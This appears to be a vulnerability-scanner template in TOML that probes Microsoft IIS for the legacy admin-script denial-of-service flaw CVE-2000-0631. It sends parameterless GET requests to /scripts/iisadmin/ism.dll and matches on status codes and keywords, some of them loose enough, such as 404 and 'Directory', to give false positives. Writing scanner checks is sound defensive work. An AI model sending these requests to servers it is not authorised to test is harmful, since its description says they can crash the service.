[info]
author = "ave"
description = "检测微软 IIS 3.0/4.0/5.0 管理脚本缺失目录浏览器参数拒绝服务漏洞 (CVE-2000-0631)。该漏洞存在于 IIS 3.0 遗留的管理脚本中，访问时未验证必需参数，导致 IIS 服务崩溃或资源耗尽。"
id = "POC-AVE-2000-00766"
name = "CVE-2000-0631 PoC"
severity = "medium"
tags = ["ave-2000-0766"]
vuln_id = [
    "CVE-2000-0631",
    "AVE-2000-0766",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/scripts/iisadmin/ism.dll"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "status"
status = [
    200,
    500,
    503,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "ISM",
    "iisadmin",
    "ISAPI",
    "Microsoft-IIS",
]

[[poc.requests]]
method = "GET"
path = "/scripts/iisadmin/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
part = "status"
status = [
    200,
    403,
    404,
    500,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "iisadmin",
    "IIS Admin",
    "Directory",
    "Microsoft-IIS",
]

